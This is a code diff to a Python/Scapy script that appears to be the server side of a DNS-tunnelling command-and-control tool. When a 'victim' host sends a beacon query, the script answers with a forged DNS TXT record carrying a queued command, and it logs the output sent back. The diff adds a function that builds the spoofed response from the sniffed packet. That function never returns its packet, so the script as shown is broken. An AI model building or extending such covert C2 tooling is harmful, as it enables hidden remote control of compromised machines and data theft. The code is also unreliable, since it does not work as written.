@@ -18,8 +18,47 @@ def commands_input():
             value = ' '.join(words[1:])         # extract all the rest as value
             commands_que = {key: value}   
             print(commands_que)
+            
+def build_p(packet,data):
+    eth = Ether(
+        src=packet[Ether].dst,
+        dst=packet[Ether].src
+        )
 
-def send_command(ip_adr,vic_sport,get_qname):
+    # Construct the IP header by looking at the sniffed packet
+    ip = IP(
+        src=packet[IP].dst,
+        dst=packet[IP].src
+        )
+
+    # Construct the UDP header by looking at the sniffed packet
+    udp = UDP(
+        dport=packet[UDP].sport,
+        sport=packet[UDP].dport
+        )
+
+    # Construct the DNS response by looking at the sniffed packet and manually
+    dns = DNS(
+        id=packet[DNS].id,
+        qd=packet[DNS].qd,
+        aa=1,
+        rd=0,
+        qr=1,
+        qdcount=1,
+        ancount=1,
+        nscount=0,
+        arcount=0,
+        an=DNSRR(
+            rrname=packet[DNS].qd.qname,
+            type='TXT',
+            ttl=600,
+            rdata=data)
+        )
+
+    # Put the full packet together
+    response_packet = eth / ip / udp / dns
+
+def send_command(ip_adr,vic_sport,get_qname,packet):
     global commands_que
     if not commands_que:
         return
@@ -42,7 +81,9 @@ def send_command(ip_adr,vic_sport,get_qname):
     print("ip addr!")
     print(ip_adr)
     print(vic_sport)
-    send(IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(rd=1,qd=DNSQR(qtype="TXT", qname=get_qname,ar=DNSRR(rdata=combined))))
+    built_pkt = build_p(packet,combined)
+    send(built_pkt)
+    #send(IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(rd=1,qd=DNSQR(qtype="TXT", qname=get_qname,ar=DNSRR(rdata=combined))))
     #pkt_send(pkt_no_data,combined,0)
 
     commands_que = ""
@@ -70,7 +111,7 @@ def parse_packet(packet):
         data_recieved = extract_data(get_qname,prefix_packet)                                # only the data(without prefix)
         if prefix_packet == BEACON:
             
-            send_command(victim_ip,vic_sport,get_qname)                 # check if there is a command in the queue and send if there is
+            send_command(victim_ip,vic_sport,get_qname,packet)                 # check if there is a command in the queue and send if there is
       
         elif prefix_packet == BEGIN_OUTPUT:           # a packet that tells the server to prepare; name of the command in the data extracted
             opened_fd = open_file(LOG_OUTPUT)
